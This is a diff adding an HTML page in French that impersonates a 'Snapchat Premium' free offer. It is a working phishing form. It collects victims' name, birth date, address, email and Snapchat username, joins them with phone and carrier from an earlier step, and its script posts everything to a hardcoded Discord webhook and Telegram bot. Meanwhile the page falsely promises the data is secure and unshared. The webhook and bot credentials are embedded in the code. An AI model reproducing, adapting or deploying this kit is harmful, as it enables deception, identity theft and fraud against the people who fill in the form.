@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Formulaire — Étape 2</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #0d0020;
+    color: #fff;
+    font-family: 'Poppins', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow-x: hidden;
+  }
+
+  /* ── FOND ── */
+  .orb {
+    position: fixed; border-radius: 50%;
+    filter: blur(90px); opacity: 0.3;
+    animation: orbFloat linear infinite; z-index: 0; pointer-events: none;
+  }
+  .orb1 { width: 600px; height: 600px; background: #7b00ff; top: -200px; left: -200px; animation-duration: 18s; }
+  .orb2 { width: 500px; height: 500px; background: #f7b500; bottom: -150px; right: -150px; animation-duration: 22s; animation-delay: -8s; }
+  .orb3 { width: 350px; height: 350px; background: #ff00cc; top: 35%; left: 55%; animation-duration: 15s; animation-delay: -4s; }
+  @keyframes orbFloat {
+    0%   { transform: translate(0,0) scale(1); }
+    33%  { transform: translate(50px,-70px) scale(1.1); }
+    66%  { transform: translate(-40px,50px) scale(0.95); }
+    100% { transform: translate(0,0) scale(1); }
+  }
+
+  .grid {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background-image:
+      linear-gradient(rgba(155,0,255,0.06) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(155,0,255,0.06) 1px, transparent 1px);
+    background-size: 60px 60px;
+    animation: gridMove 20s linear infinite;
+  }
+  @keyframes gridMove { from { background-position: 0 0; } to { background-position: 60px 60px; } }
+
+  .particles { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+  .p { position: absolute; border-radius: 50%; animation: rise linear infinite; opacity: 0; }
+  @keyframes rise {
+    0%   { transform: translateY(0) scale(0); opacity: 0; }
+    10%  { opacity: 1; } 90% { opacity: 0.5; }
+    100% { transform: translateY(-100vh) scale(1.5); opacity: 0; }
+  }
+
+  /* ── LAYOUT PC ── */
+  .page {
+    position: relative; z-index: 10;
+    display: flex; align-items: flex-start; gap: 60px;
+    padding: 40px 60px;
+    width: 100%; max-width: 1100px;
+    animation: slideUp 0.6s cubic-bezier(0.16,1,0.3,1) both;
+  }
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ── COLONNE GAUCHE ── */
+  .info-col {
+    flex: 1;
+    position: sticky; top: 40px;
+    display: flex; flex-direction: column; gap: 28px;
+  }
+
+  .brand { display: flex; align-items: center; gap: 14px; }
+  .brand-logo {
+    width: 56px; height: 56px;
+    background: linear-gradient(135deg, #FFFC00, #f7b500);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px;
+    box-shadow: 0 0 24px rgba(247,181,0,0.4);
+    animation: logoPulse 2s ease-in-out infinite;
+    flex-shrink: 0;
+  }
+  @keyframes logoPulse {
+    0%,100% { box-shadow: 0 0 0 0 rgba(247,181,0,0.4), 0 4px 20px rgba(247,181,0,0.3); }
+    50%      { box-shadow: 0 0 0 10px rgba(247,181,0,0), 0 4px 30px rgba(247,181,0,0.5); }
+  }
+  .brand-name { font-size: 20px; font-weight: 700; }
+  .brand-sub  { font-size: 12px; color: rgba(255,255,255,0.4); margin-top: 2px; }
+
+  .info-title {
+    font-size: 36px; font-weight: 700; line-height: 1.2;
+    background: linear-gradient(135deg, #fff 30%, #c97fff 80%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .info-title span { -webkit-text-fill-color: #f7b500; }
+
+  .info-desc { font-size: 15px; color: rgba(255,255,255,0.5); line-height: 1.7; }
+
+  /* Progress steps */
+  .progress { display: flex; flex-direction: column; gap: 0; }
+  .prog-item {
+    display: flex; align-items: flex-start; gap: 14px;
+  }
+  .prog-left { display: flex; flex-direction: column; align-items: center; }
+  .prog-dot {
+    width: 32px; height: 32px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 700; flex-shrink: 0;
+  }
+  .prog-dot.done  { background: rgba(77,255,136,0.2); border: 1px solid rgba(77,255,136,0.5); color: #4dff88; }
+  .prog-dot.active{ background: rgba(247,181,0,0.2); border: 1px solid rgba(247,181,0,0.5); color: #f7b500; }
+  .prog-dot.next  { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.15); color: rgba(255,255,255,0.3); }
+  .prog-line { width: 2px; height: 28px; background: rgba(255,255,255,0.08); margin: 4px 0; }
+  .prog-text { padding-top: 6px; }
+  .prog-label { font-size: 14px; font-weight: 600; color: rgba(255,255,255,0.8); }
+  .prog-sub   { font-size: 12px; color: rgba(255,255,255,0.35); margin-top: 2px; }
+  .prog-item.active .prog-label { color: #f7b500; }
+
+  /* ── COLONNE DROITE (card) ── */
+  .card {
+    width: 460px; flex-shrink: 0;
+    background: rgba(255,255,255,0.04);
+    backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 28px; padding: 36px 36px 32px;
+    box-shadow: 0 0 0 1px rgba(155,0,255,0.15) inset, 0 20px 60px rgba(0,0,0,0.5), 0 0 80px rgba(123,0,255,0.12);
+    position: relative;
+  }
+  .card::before {
+    content: ''; position: absolute; inset: -1px; border-radius: 29px;
+    background: linear-gradient(135deg, rgba(155,0,255,0.5), rgba(247,181,0,0.3), rgba(255,0,204,0.3), rgba(155,0,255,0.5));
+    background-size: 300% 300%;
+    animation: borderGlow 4s ease infinite;
+    z-index: -1;
+    mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    mask-composite: exclude; -webkit-mask-composite: xor; padding: 1px;
+  }
+  @keyframes borderGlow {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  .step-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(247,181,0,0.12); border: 1px solid rgba(247,181,0,0.3);
+    border-radius: 20px; padding: 5px 14px;
+    font-size: 12px; font-weight: 500; color: #f7b500;
+    margin-bottom: 18px;
+  }
+
+  .card h2 {
+    font-size: 20px; font-weight: 700; margin-bottom: 6px;
+    background: linear-gradient(135deg, #fff 40%, #c97fff);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .card .sub { font-size: 13px; color: rgba(255,255,255,0.4); margin-bottom: 24px; }
+
+  /* Groupes de champs */
+  .field-section {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 16px; padding: 16px; margin-bottom: 14px;
+  }
+  .field-section-title {
+    font-size: 11px; font-weight: 600; text-transform: uppercase;
+    letter-spacing: 0.8px; color: rgba(255,255,255,0.3);
+    margin-bottom: 12px; display: flex; align-items: center; gap: 6px;
+  }
+
+  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .form-group { margin-bottom: 10px; }
+  .form-group:last-child { margin-bottom: 0; }
+
+  label {
+    display: block; font-size: 11px; font-weight: 600;
+    color: rgba(255,255,255,0.45); text-transform: uppercase;
+    letter-spacing: 0.6px; margin-bottom: 6px; padding-left: 2px;
+  }
+
+  .input-wrap { position: relative; }
+  .input-icon {
+    position: absolute; left: 13px; top: 50%; transform: translateY(-50%);
+    font-size: 15px; pointer-events: none; z-index: 1;
+  }
+
+  input {
+    width: 100%; padding: 11px 12px 11px 40px;
+    background: rgba(255,255,255,0.05);
+    border: 1.5px solid rgba(255,255,255,0.1);
+    border-radius: 10px; color: #fff;
+    font-size: 14px; font-family: 'Poppins', sans-serif;
+    outline: none; appearance: none;
+    transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
+  }
+  input[type="date"] { color-scheme: dark; }
+  input:focus {
+    border-color: #f7b500; background: rgba(247,181,0,0.06);
+    box-shadow: 0 0 0 3px rgba(247,181,0,0.12);
+  }
+  input::placeholder { color: rgba(255,255,255,0.22); }
+
+  button {
+    width: 100%; padding: 14px; margin-top: 6px;
+    background: linear-gradient(135deg, #f7b500, #ff8c00);
+    color: #1a0030; font-family: 'Poppins', sans-serif;
+    font-size: 15px; font-weight: 700; border: none;
+    border-radius: 12px; cursor: pointer;
+    box-shadow: 0 4px 24px rgba(247,181,0,0.4);
+    transition: transform 0.2s, box-shadow 0.2s;
+    position: relative; overflow: hidden;
+  }
+  button .shine {
+    position: absolute; inset: 0;
+    background: linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.3) 50%, transparent 60%);
+    transform: translateX(-100%); transition: transform 0.6s;
+  }
+  button:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(247,181,0,0.55); }
+  button:hover .shine { transform: translateX(100%); }
+  button:active { transform: translateY(0); }
+
+  #msg { margin-top: 14px; font-size: 13px; font-weight: 500; text-align: center; min-height: 20px; }
+  .footer-note { text-align: center; font-size: 11px; color: rgba(255,255,255,0.2); margin-top: 16px; }
+
+  /* ══════════════════════════════
+     MOBILE  (≤ 768px)
+  ══════════════════════════════ */
+  @media (max-width: 768px) {
+    body { align-items: flex-start; overflow-y: auto; }
+
+    .page {
+      flex-direction: column; gap: 0;
+      padding: 0; width: 100%; max-width: 100%;
+      min-height: 100vh;
+    }
+
+    .info-col {
+      position: static;
+      gap: 0;
+      background: linear-gradient(180deg, rgba(123,0,255,0.2) 0%, transparent 100%);
+      padding: 32px 24px 24px;
+      border-bottom: 1px solid rgba(255,255,255,0.07);
+    }
+    .info-title { font-size: 24px; margin-top: 14px; }
+    .info-desc  { font-size: 13px; margin-top: 8px; }
+    .progress   { display: none; }
+
+    .card {
+      width: 100%; border-radius: 0;
+      border-left: none; border-right: none; border-bottom: none;
+      padding: 24px 20px 48px;
+      box-shadow: none; flex: 1;
+    }
+    .card::before { display: none; }
+
+    .form-row { grid-template-columns: 1fr; }
+    input { font-size: 16px; padding: 13px 12px 13px 40px; }
+    button { font-size: 16px; padding: 15px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="grid"></div>
+<div class="particles" id="particles"></div>
+
+<div class="page">
+
+  <!-- Colonne gauche -->
+  <div class="info-col">
+    <div class="brand">
+      <div class="brand-logo">👻</div>
+      <div>
+        <div class="brand-name">Snapchat Premium</div>
+        <div class="brand-sub">Offre exclusive 2025</div>
+      </div>
+    </div>
+
+    <div class="info-title">Plus qu'une<br><span>étape !</span></div>
+    <div class="info-desc">Complétez vos informations pour finaliser votre inscription et recevoir votre accès premium gratuit.</div>
+
+    <div class="progress">
+      <div class="prog-item">
+        <div class="prog-left">
+          <div class="prog-dot done">✓</div>
+          <div class="prog-line"></div>
+        </div>
+        <div class="prog-text">
+          <div class="prog-label">Numéro de téléphone</div>
+          <div class="prog-sub">Étape complétée</div>
+        </div>
+      </div>
+      <div class="prog-item active">
+        <div class="prog-left">
+          <div class="prog-dot active">2</div>
+          <div class="prog-line"></div>
+        </div>
+        <div class="prog-text">
+          <div class="prog-label">Informations personnelles</div>
+          <div class="prog-sub">En cours</div>
+        </div>
+      </div>
+      <div class="prog-item">
+        <div class="prog-left">
+          <div class="prog-dot next">3</div>
+        </div>
+        <div class="prog-text">
+          <div class="prog-label">Activation premium</div>
+          <div class="prog-sub">Prochaine étape</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Colonne droite -->
+  <div class="card">
+    <div class="step-badge">📋 Étape 2 sur 2</div>
+    <h2>Vos informations 📝</h2>
+    <p class="sub">Tous les champs sont requis sauf mention contraire</p>
+
+    <form id="form2">
+
+      <div class="field-section">
+        <div class="field-section-title">👤 Identité</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Nom</label>
+            <div class="input-wrap">
+              <span class="input-icon">🪪</span>
+              <input name="nom" placeholder="Dupont" required />
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Prénom</label>
+            <div class="input-wrap">
+              <span class="input-icon">🪪</span>
+              <input name="prenom" placeholder="Jean" required />
+            </div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Date de naissance</label>
+          <div class="input-wrap">
+            <span class="input-icon">🎂</span>
+            <input name="naissance" type="date" required />
+          </div>
+        </div>
+      </div>
+
+      <div class="field-section">
+        <div class="field-section-title">🏠 Adresse</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Ville</label>
+            <div class="input-wrap">
+              <span class="input-icon">🏙️</span>
+              <input name="ville" placeholder="Paris" required />
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Code postal</label>
+            <div class="input-wrap">
+              <span class="input-icon">📮</span>
+              <input name="codePostal" placeholder="75001" required />
+            </div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Adresse <span style="color:rgba(255,255,255,0.25);text-transform:none;font-weight:400">(facultatif)</span></label>
+          <div class="input-wrap">
+            <span class="input-icon">📍</span>
+            <input name="adresse" placeholder="12 rue de la Paix" />
+          </div>
+        </div>
+      </div>
+
+      <div class="field-section">
+        <div class="field-section-title">📱 Contact</div>
+        <div class="form-group">
+          <label>Email</label>
+          <div class="input-wrap">
+            <span class="input-icon">✉️</span>
+            <input name="email" type="email" placeholder="jean@email.com" required />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Nom Snapchat</label>
+          <div class="input-wrap">
+            <span class="input-icon">👻</span>
+            <input name="snap" placeholder="mon.snap" required />
+          </div>
+        </div>
+      </div>
+
+      <button type="submit"><span class="shine"></span>Valider mon inscription →</button>
+    </form>
+
+    <div id="msg"></div>
+    <p class="footer-note">🔒 Vos données sont sécurisées et ne seront pas partagées</p>
+  </div>
+
+</div>
+
+<script>
+  /* Particules */
+  const container = document.getElementById('particles');
+  const colors = ['#f7b500','#9b00ff','#ff00cc','#ffffff','#00cfff'];
+  for (let i = 0; i < 45; i++) {
+    const p = document.createElement('div');
+    p.className = 'p';
+    const size = Math.random() * 6 + 2;
+    p.style.cssText = `width:${size}px;height:${size}px;left:${Math.random()*100}%;bottom:${Math.random()*15}%;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${Math.random()*12+8}s;animation-delay:${Math.random()*10}s;opacity:0;`;
+    container.appendChild(p);
+  }
+
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1503507408809361508/Xt5IMEASOMvXtilR5vMq1zvw38sjwuXrByasBmU886pHOMEkIMC6-v7__LK2tdjuQd9R";
+  const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1503507408809361508/Xt5IMEASOMvXtilR5vMq1zvw38sjwuXrByasBmU886pHOMEkIMC6-v7__LK2tdjuQd9R";
+  const TELEGRAM_TOKEN = "8376532446:AAEJHOCBBO8KrHJb2pnrsu2e1-Ow17pl9r0";
+  const TELEGRAM_CHAT_ID = "8431463416";
+
+  async function sendDiscord(embed, webhookUrl) {
+    return fetch(webhookUrl, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({embeds:[embed]}) });
+  }
+  async function sendTelegram(text) {
+    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ chat_id:TELEGRAM_CHAT_ID, text, parse_mode:"Markdown", disable_web_page_preview:true })
+    });
+  }
+
+  document.getElementById("form2").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const msgElem = document.getElementById("msg");
+    msgElem.style.color = "rgba(255,255,255,0.5)";
+    msgElem.textContent = "⏳ Envoi en cours...";
+
+    const formData = new FormData(e.target);
+    const step2 = {
+      nom: formData.get("nom"), prenom: formData.get("prenom"),
+      naissance: formData.get("naissance"), email: formData.get("email"),
+      ville: formData.get("ville"), codePostal: formData.get("codePostal"),
+      adresse: formData.get("adresse"), snap: formData.get("snap")
+    };
+
+    const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
+    const operateur = step1.operateur || "Non fourni";
+    const telephone = step1.telephone || "Non fourni";
+
+    let webhookToUse = DISCORD_WEBHOOK_URL;
+    if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
+      webhookToUse = DISCORD_ALT_WEBHOOK_URL;
+    }
+
+    const discordEmbed = {
+      title: "🏴‍☠️ +1 Entrée 🏴‍☠️",
+      color: 0x9b00ff,
+      fields: [{
+        name: "\u200B",
+        value:
+          `|🇪🇪| Nom         : ${step2.nom}\n` +
+          `|🇪🇪| Prénom      : ${step2.prenom}\n` +
+          `|🇪🇪| Naissance   : ${step2.naissance || "Non fournie"}\n` +
+          `|🇪🇪| Snapchat    : ${step2.snap || "Non fourni"}\n\n` +
+          `|🏠| Adresse     : ${step2.adresse || "Non fournie"}\n` +
+          `|🏠| Ville       : ${step2.ville}\n` +
+          `|🏠| Code Postal : ${step2.codePostal}\n\n` +
+          `|🪁| Email       : ${step2.email}\n` +
+          `|🪁| Téléphone   : ${telephone}\n` +
+          `|🪁| Opérateur   : ${operateur}`
+      }],
+      timestamp: new Date().toISOString(),
+      footer: { text: "📥 Données reçues via le formulaire" }
+    };
+
+    const telegramText =
+      `🏴‍☠️ v2 zeleph 🏴‍☠️\n\n` +
+      `|🇪🇪| Nom : ${step2.nom}\n|🇪🇪| Prénom : ${step2.prenom}\n` +
+      `|🇪🇪| Naissance : ${step2.naissance}\n|🇪🇪| Snapchat : ${step2.snap}\n\n` +
+      `|🏠| Adresse : ${step2.adresse || "Non fournie"}\n` +
+      `|🏠| Ville : ${step2.ville}\n|🏠| Code Postal : ${step2.codePostal}\n\n` +
+      `|🪁| E‑Mail : ${step2.email}\n|🪁| Opérateur : ${operateur}\n|🪁| Téléphone : ${telephone}`;
+
+    try {
+      await Promise.all([sendDiscord(discordEmbed, webhookToUse), sendTelegram(telegramText)]);
+      msgElem.style.color = "#4dff88";
+      msgElem.textContent = "✅ Données envoyées ! Redirection...";
+      localStorage.setItem("step2", JSON.stringify(step2));
+      setTimeout(() => window.location.href = "merci.html", 1000);
+    } catch (err) {
+      msgElem.style.color = "#ff4d4d";
+      msgElem.textContent = "❌ Erreur lors de l'envoi.";
+      console.error(err);
+    }
+  });
+</script>
+</body>
+</html>
